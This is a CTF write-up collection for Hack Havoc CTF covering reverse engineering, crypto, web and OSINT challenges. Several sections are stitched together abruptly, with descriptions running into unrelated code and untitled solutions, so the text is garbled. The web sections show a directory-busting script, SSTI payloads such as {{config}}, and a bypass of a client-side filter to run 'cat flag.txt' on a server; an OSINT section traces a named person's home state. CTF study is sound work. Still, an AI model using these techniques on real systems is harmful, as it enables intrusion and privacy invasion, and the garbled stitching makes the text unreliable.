# Reverse Engineering
## <u>Rev is easy!</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Rev
* **Point Value / Difficulty:** 20
### Description
Welcome to the ‚ÄúRev is Easy!‚Äù challenge at CyberMaterial! Think you‚Äôre clever enough to outsmart our file? Prove that ‚ÄúRev‚Äù isn‚Äôt just short for ‚ÄúReverse Engineering,‚Äù but also for ‚ÄúReally Easy Victory!‚Äù
### Solution
A simple `strings` on the binary and grep reveals the flag.

Flag:- `CM{ReV_i5_Easy}`

## <u>Go Crazy</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Rev
* **Point Value / Difficulty:** 30
### Description
In a small, dimly lit room, a determined hacker named killswxtch sits in front of an old, flickering computer screen. They find a book with a note that reads, "Check the sequence." Using this clue, killswxtch deciphers the password and enters it, unlocking a hidden door that reveals secret manuscripts.
### Solution
Putting the binary in a decompiler (I used `ghidra`), We get the following decompilation.
![](go_crazy.png)

It is clearly seen that on entering the password, the secret is getting printed. So I just took the byte values starting from `local_28 to local_1a`, and converted back to ascii and got the flag.

```python
bytes.fromhex("434d7b354f5f4d7543685f37756e7d")
```
Output:- `b'CM{5O_MuCh_7un}'`

Flag :- `CM{5O_MuCh_7un}`


## <u>Who‚Äôs Really Dunked?</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Rev
* **Point Value / Difficulty:** 40
### Description
Cosmicgurl::92 says, "R47RoO7::47 is drunk!" üçª R47RoO7::47 responds, "JavaScript::00 is drunk!" ü§™ And then, out of nowhere, JavaScript stumbles in and says, "Yep, I'm actually drunk!" üçπ

So, let‚Äôs do a reverse cosmic dance to figure out who‚Äôs really had one too many. Spoiler alert: it looks like JavaScript is the real party animal! üöÄü•≥
### Solution
I just simply put the encrypted text to cipher identifier which told that, it was `base92` as  indicated by `Cosmicgurl`. 
Output after base92 decryption:-

Next from the description it was obvious that it is ROT-47. So again I put it in dcode and got the following js:-
```js
const crypto = require('crypto');
const readline = require('readline');

// Create an interface to read input from the user
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Initial flag prefix
let flagPrefix = "CM{";

// Function to check user inputs and validate the flag
function check() {
  rl.question('Enter first value: ', (valueOne) => {
      rl.question('Enter second value: ', (valueTwo) => {
          rl.question('Enter third value: ', (valueThree) => {
              rl.close();

              // Initialize flag with the prefix
              let flag = flagPrefix;

              // Append parts to the flag based on input values
              if (valueOne === "News") {
                  flag += "News_";
              }

              if (valueTwo === "Alerts") {
                  flag += "Alerts_";
              }

              if (valueThree === "Incident") {
                  flag += "Incident";
              }

              flag += "}";

              // Check if the computed hash matches the expected hash
              const expectedHash = "805d65570539763df20da6ab7d596676bb3da41a06dae7675718f6c2b755a28d"
              if (hash(flag) === expectedHash) {
                  console.log("Congratulations! The flag is: " + flag);
              } else {
                  console.log("Incorrect flag. Try again.");
              }
          });
      });
  });
}

// Function to compute SHA-256 hash
function hash(input) {
  return crypto.createHash('sha256').update(input).digest('hex');
}

// Start the challenge
check();
```

On analyzing this code the flag is pretty obvious .

Flag:- `CM{News_Alerts_Incident}`


## <u>The Key to Nowhere</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Rev
* **Point Value / Difficulty:** 60
### Description
You‚Äôve got your hands on a mysterious file called wkwkwkkw, and the word on the street is that only those with a sharp mind and a good sense of humor can unlock its secrets. Legend says it holds the key to something... static, perhaps? Who knows?

### Solution
At first I decompile the binary using ghidra. On checking the stripped `entry` and just going into the rabbit hole a bit, I notice `FUN_004032a0("Could not load PyInstaller\'s embedded PKG archive from the executable (%s)\n"`

The thing to be noted is `PyInstaller`. SO the binary is packed using `PyInstaller`. To unpack this a tool called [PyExtractor](https://github.com/extremecoders-re/pyinstxtractor) is available on github.

Just run the command with the binary:-
`.\pyinstxtractor-ng.exe .\wkwkwkkw`

And it unpacks the packed file into a separate folder.
![](unpack.png)

Now inside the folder we have `3.pyc`. A `pyc` file. To read the actual code from a pyc file, there is another tool called [pycdc](https://github.com/zrax/pycdc). It is also available on github.

Build the tool and run the following command:-
`/mnt/d/bi0s/pycdc/pycdc 3.pyc`

This will show the original python code.

```python
# Source Generated with Decompyle++
# File: 3.pyc (Python 3.10)


def xor_encrypt(data, key):
    '''Encrypt or decrypt data using XOR with the given key.'''
    return None((lambda .0 = None: for i, c in .0:
chr(ord(c) ^ ord(key[i % len(key)])))(enumerate(data)))


def get_hidden_key():
    '''Retrieve the hidden key.'''
    return ''.join((lambda .0: for c in .0:
chr(c))((83, 84, 65, 84, 73, 67, 75, 69, 72)))


def get_hidden_flag():
    '''Retrieve the hidden flag.'''
    return ''.join((lambda .0: for c in .0:
chr(c))((82, 51, 86, 95, 68, 52, 84, 52, 95, 72, 51, 114, 79)))


def main():
    key = get_hidden_key()
    flag = get_hidden_flag()
    encrypted_flag = xor_encrypt(flag, key)
    print('Welcome to CyberMaterial, where only the brave dare to crack the code!')
    response = input('Do you think you can outsmart the system? (yes/no): ').strip().lower()
    if response == 'yes':
        user_input = input('Alright, savvy one! Enter the secret key: ')
        if user_input == key:
            decrypted_flag = xor_encrypt(encrypted_flag, key)
            print(f'''Congratulations! Here\'s your flag: CM{{{decrypted_flag}}}''')
            return None
        None('Oops! Incorrect key. Try again.')
        return None
    None('I see you‚Äôre a true codebreaker! No key needed. The flag is hidden, but you‚Äôre smart enough to find it. Good luck!')

if __name__ == '__main__':
    main()
    return None
```

Now we can see the `get_hidden_flag`. I just took the list, and converted and got the flag.

```python
''.join(chr(i)for i in [82, 51, 86, 95, 68, 52, 84, 52, 95, 72, 51, 114, 79])
```

Output:- "R3V_D4T4_H3rO"

Flag:- `CM{R3V_D4T4_H3rO}`


## <u>Awwwwwwwwwwwwwww!!</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Rev
* **Point Value / Difficulty:** 80
### Description
So Much Awwww & Awaaaaaaaaaaa by  
[Jelly Hoshiumi](https://x.com/jellyhoshiumi)

Flag: Enclosed string with CM{....}
### Solution

This exact same challenge came in `vsCTF24`. I solved it that time in that ctf. I went to the folder to find my script but it was not there. Ig I did that in IDLE. So I simply went to the github repo where the writeup was already there because why not? Use the resources at hand.
Writeup Link:- https://github.com/D13David/ctf-writeups/blob/main/vsctf24/rev/README.md

I simply took the code, and changed the file name and value as necessary. The file was exactly the same as the vsCTF one. I just blindly ran it, but later realized the output was different. So changed it and ran the script and got the flag.

```python
COMMAND_BITS = 5

def parseBlock(block):
    result = ""
    while len(block) != 0:
        if block.startswith("awa"):
            result += "0"
            block = block[3:]
        elif block.startswith("wa"):
            result += "1"
            block = block[2:]
    return result

def awaize(bits, size):
    tmp = []
    while bits != 0:
        tmp.append(" awa" if bits & 1 == 0 else "wa")
        bits >>= 1

    for i in range(len(tmp), size):
        tmp.append(" awa")

    return "".join(tmp[::-1]).strip()

def parseBits(index, data, length):
    return (index+length, int(data[index:index+length],2))

commands = {
                0x00: ("nop", 0),

                0x13: ("lss", 0),
                0x14: ("gr8", 0),
                0x1F: ("trm", 0),
           }

def handleCommand(index, data, cmd, awaized):
    try:
        cmd_info = commands[cmd]
        if cmd_info[1] != 0:
            index, param = parseBits(index, data, cmd_info[1])
            disasm = f"{cmd_info[0]} {param}"
        else:
            disasm = cmd_info[0]

        if awaized:
            param = f" | {awaize(param, cmd_info[1])}" if cmd_info[1] != 0 else ""
            print(f"{(awaize(cmd, COMMAND_BITS)+param).ljust(42)} {disasm}")
        else:
            print(disasm)
    except:
        print(f"unknown command {cmd}")

    return index

if __name__ == "__main__":
    data = open("awwwww.txt", "r").read().split(" ")

    bits = ""
    for block in data[1:]:
        bits += parseBlock(block)

    index = 0
    while index < len(bits):
        index, cmd = parseBits(index, bits, COMMAND_BITS)
        index = handleCommand(index, bits, cmd, True)
```

Output:-

Next had to write change the output as the given image.

```python
data = list("owoosHiai1w1aia_awJ3ally!0awwa_o")
subm = [2, 3, 4, 1, 6, 5, 3, 10, 20, 22, 25, 3, 0, 0, 2, 3, 4, 1, 6, 5, 3, 10, 20, 22, 25, 3, 0, 0, 0, 16, 26, 31]

for i in subm[::-1]:
    if i != 0:
        data = [data[i]] + data[0:i] + data[i+1:]
    else:
        data.insert(0, data[-1])
        data = data[:-1]

print("".join(data))
```

Output:- `awawawawaawa_0oooosHii11i_J3lly!`

Flag:- `CM{awawawawaawa_0oooosHii11i_J3lly!}`

## Digital Black Hole

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Crypto
* **Point Value / Difficulty:** 40
### Description

b=[int(i,2) for i in d.split(" ")]
print(b)
```
Output:- `[56, 83, 78, 90, 57, 82, 110, 49, 76, 67, 89, 109, 87, 110, 114, 53, 68, 86, 76, 99, 121, 104, 90, 13, 10]`

Next char convertion:-

```python
for i in b:
    print(chr(i), end="")
```

Output:- `8SNZ9Rn1LCYmWnr5DVLcyhZ`

Put this in dcode cipher identifier and it shows `base62`

Decrypt it.

## <u>Dear Trithemius,</u>

* **Event:** Hack Havoc CTF by Cyber 
* **Problem Type:** Crypto
* **Point Value / Difficulty:** 60
### Description
The encryption method used in this cipher is a variation of the Caesar cipher, but with a twist. Each letter in the plaintext is shifted by a different amount depending on its position in the string. Non-alphabetic characters remain unchanged. To decrypt, reverse this shifting process.

Flag: Enclosed string with CM{....}
### Solution
We have a `go` program which is pretty easy to reverse.
It mainly deals with the `Uppercase letters` and keeps the `non alphabet` the same.
The solve script is pretty straightforward
```python
def to_h(owo):
    return ord(owo) - 0x41

def from_l(uwu):
    return chr(uwu % 26 + 0x41)

def decrypt(e):
    original_message = ''
    for i in range(len(e)):
        letters = e[i]
        if not letters.isalpha():
            owo = letters
        else:
            uwu = to_h(letters)
            owo = from_l(uwu - i)
        original_message += owo
    return original_message

c="LPXH_Z_AZRDSQZWJI"
d = decrypt(c)
print(d)

[http://challenge.ctf.cybermaterial.com/dissssissssimpul/](http://challenge.ctf.cybermaterial.com/dissssissssimpul/)
### Solution
On going to the website we see stiff written in various languages as said that the website was drunk.

I checked the source code to find another href `http://challenge.ctf.cybermaterial.com/dissssissssimpul/homepage.html#`. 

Also there were fake flags on both of the previous pages.

Here also it was kindoff similar. Again checking the source code I saw an invisible button code, which takes to the link `http://challenge.ctf.cybermaterial.com/dissssissssimpul/0.html`.


On checking its source code, we find the flag.

### Description
‚ÄúNow let it work. Mischief, thou art afoot. Take thou what course thou wilt‚Äù -Mark Antony

http://challenge.ctf.cybermaterial.com/challenge1/

### Solution
This challenge wasn't really hard but then again, felt a bit guessing. In the Website, it was written so the first thing I tried was directory busting.

Tried to use the `dirb` tool but the connection was getting broken all the time. So I wrote a custom python script with the `common.txt` which `dirb` uses to to do directory busting. 
```python
#!/usr/bin/env python3
import requests
# the url we are going to post to 
url='http://challenge.ctf.cybermaterial.com/challenge1/'

with open("common.txt",'rb') as f:
    a=f.read().split(b"\n")
    # print(a)
    for i in a:
        # print(i)
        try:
            response_get = requests.get(url+i.decode())
            if response_get.status_code == 200:
                print(i.decode())
                print(response_get.text)
        except:
            pass
```

From this I found out directories such as `/images, /files, /style`. These directories didn't really contain anything useful. Found some more `/admin, /directories`. These led to something called `Wrong door`. Thought that this might be the way. Stuck on it for a long time.

Read a few writeups online after some guessing games found the directory `/users`

```

This had the encrypted flag.
On putting that in cipher identifier(https://www.dcode.fr/cipher-identifier), got to know its `base58`

On decrypting we get `C3Mr{3id_}c4me_i_s4w_i_c0nqu`
On rearranging a bit we get the flag.

Flag:- `CM{i_c4me_i_s4w_i_c0nqu3r3d}`

### Solution
On opening the website, we see a form input. On putting a name, it shows forbidden. 

Based on the `shell shocker` challenge, I noticed that the `/b` went missing while executing. So I opened `burpsuite` and changed the request.

On sending this request we get something like this:-
![](bidden.png)

On seeing this, I searched about some possible vulnerabilities, and `ssti` was one of them. To verify it I found a stand payload `{{7*7}}` on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

On sending it instead of name I got the value of the expression.
`„Åì„Çì„Å´„Å°„ÅØ 49`

Hence ssti was confirmed. Now there only I found this other payload `{{config}}` and this was the correct one.

`http://challenge.ctf.cybermaterial.com/?name={{config}}`
The above is the payload, and it gives the flag.

## <u>The Shell Shocker</u>

* **Event:** Hack Havoc CTF by CyberMaterial
* **Problem Type:** Web
* **Point Value / Difficulty:** 80
### Description
Our CyberMaterial developer thought they‚Äôd created the ultimate basic Linux shell, only the essentials, nothing fancy. But we think they might have missed a trick or two. üòè

Your task? See if you can get this shell to do something it wasn‚Äôt exactly ‚Äúdesigned‚Äù to do. Think of it like asking a fish to climb a tree. üå≥üêü

http://challenge.ctf.cybermaterial.com/a/

### Solution
On opening the website I immediately tried to run some linux commands but it didn't work.

Inspected the website, and came to `network` and refreshed the page. Saw that path of the `styles.css` and `script.js` was not properly configured. and it can't get it from its directory.

Went to `/static/script.js` and `/static/style.css` and found out the files.

Script.js
```js
const commandForm = document.querySelector('#command-form');
const commandInput = document.querySelector('#command-input');
const outputDiv = document.querySelector('#output');

commandForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const command = commandInput.value;
  
  const validCommand = /^((uname|echo|pwd|whoami)\s*([-\w\s]*))?$/i.test(command);
  
  if (!validCommand) {
    outputDiv.textContent = 'Error: Invalid command. Please enter a valid command (uname, echo, pwd, or whoami) with optional arguments and options separated by spaces and hyphens.';
    return;
  }
  
  try {
    const response = await fetch('/exec', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ command }) 
    });
    const result = await response.text();
    outputDiv.textContent = result;
  } catch (error) {
    console.error(error);
    outputDiv.textContent = `Error: ${error.message}`;
  }
});
```

According to the regex we can use commands like uname, echo, pwd, whoami.

Now I open the website on `burpsuite` to intercept the requests, fix them and then send to the server.

We change the request 
```
GET /a/%7B%7B%20url_for('static',%20filename='style.css')%20%7D%7D HTTP/1.1
Host: challenge.ctf.cybermaterial.com

Accept: text/css,*/*;q=0.1
Purpose: prefetch

Accept-Encoding: gzip, deflate, br

```

and

```
GET /a/%7B%7B%20url_for('static',%20filename='script.js')%20%7D%7D HTTP/1.1
Host: challenge.ctf.cybermaterial.com
Sec-Purpose: prefetch;prerender

Accept: */*
Purpose: prefetch
Referer: http://challenge.ctf.cybermaterial.com/a/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

to this
```
GET /a/static/script.js HTTP/1.1
Host: challenge.ctf.cybermaterial.com
Sec-Purpose: prefetch;prerender
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: */*
Purpose: prefetch
Referer: http://challenge.ctf.cybermaterial.com/a/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Now both the css and js files will be properly loaded. Next lets try any random command which is allowed.

The request we get is 
```
POST /exec HTTP/1.1
Host: challenge.ctf.cybermaterial.com
Content-Length: 17
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://challenge.ctf.cybermaterial.com
Referer: http://challenge.ctf.cybermaterial.com/a/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"command":"pwd"}
```

We see that it is `POST /exec` but the website has a `/a`. So we modify this request as well by writing `/a/exec` instead of `/exec` and forward it.

![](shell_1.png)

It shows `Command not allowed`. The server has some other implementation. Either ways, next just try the command `ls` but change the request instead of writing in the website as it will show error due to the client side js. 

The output we get is `{"output":"__pycache__\napp.py\nflag.txt\nindex.html\nstatic\ntemplates\n"}`

Next just send `cat flag.txt` as the command and viola, you get the flag.
```
POST /a/exec HTTP/1.1
Host: challenge.ctf.cybermaterial.com
Content-Length: 17
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36

### Solution

This the challenge that I spent a lot of unnecessary time on. The solution was really simple tho.

First I went to the socials of `Cover6 Solutions` to find info about the person in the picture.
On insta I found his name. `Tyrone E. Wilson` the CEO. From there I searched him on LinkedIn, and found that he stays in `Virginia`.

Next step I spent the most time on. On google road view I tried to find the place in virginia that had both `waffle inn and subway`.  After frying my braincells altogether, I searched `"Waffle inn" Virginia` and this gave me the answer. It was just that simple.

### Solution

Based on the description I started out with the website of Cybermaterial under `apt` to find for `Lazarus`. I did find out a post but wasn't that helpful.

Did a google search after that including the sub group name `Andariel`, and found another post.
